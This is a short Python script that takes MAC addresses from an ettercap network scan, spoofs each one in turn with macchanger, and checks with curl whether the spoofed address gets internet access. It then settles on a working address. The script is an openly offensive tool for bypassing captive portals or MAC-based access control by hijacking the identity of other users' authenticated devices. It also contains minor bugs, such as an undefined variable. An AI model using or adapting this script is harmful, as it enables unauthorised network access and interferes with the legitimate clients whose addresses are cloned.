import netifaces as ni

import random
import subprocess
import sys
import time


def waitForAndCheckInternet():
    interval = 0.5
    # first, wait until we've reconnected to the wifi
    # we give this a timeout of 10 seconds before trying again
    timeout = 10
    while ni.AF_INET not in ni.ifaddresses(iface):
        timeout -= interval
        if timeout == 0:
            timeout = 20
            # restart the interface
            resetInterface(None)
        time.sleep(interval)

    # check a known 200 response from CURL
    # sometimes this can randomly take a while so retry if > 5 seconds
    # if we've been doing this for > 30 seconds, someting bad happened
    for loopCounter in range(12):
        try:
            result = subprocess.run(('curl', '-I', 'neverssl.com'),
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, timeout=5)
            if result.returncode == 0:
                break
            time.sleep(increment)
        except:
            # curl timed out? try again
            pass
    return result.stdout[:15] == b'HTTP/1.0 200 OK'

def resetInterface(mac):
    subprocess.run(('service', 'network-manager', 'stop'), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if mac:
        subprocess.run(('macchanger', '-m', mac, iface), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(('service', 'network-manager', 'start'), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def run(candidates, keepGoing=False):
    valid = []
    total = len(candidates)
    for idx, mac in enumerate(candidates):
        print("Attempt {}/{} ({})".format(idx+1, total, mac))
        resetInterface(mac)
        success = waitForAndCheckInternet()
        if success:
            print("    SUCCESS!")
            valid.append(mac)
            if not keepGoing:
                break
    if len(valid):
        print("\nMACs which have access to the Internet:")
        for mac in valid:
            print(mac)
        selected = valid[int(random.random() * len(valid))]
        print("\nUsing: {}".format(selected))
        resetInterface(valid[0])

# for now, hardcode these values
keepGoing = True
iface = 'wlp58s0'

# for now, read hosts file from ettercap host scan output
with open('/tmp/hosts') as file:
    macs = []
    lines = file.readlines()
    for entry in lines:
        parts = entry.split()
        macs.append(parts[1])
    # run in reverse, and skip the last (originally first) two since these tend to be the gateway stuff
    run(macs[:1:-1], keepGoing=keepGoing)
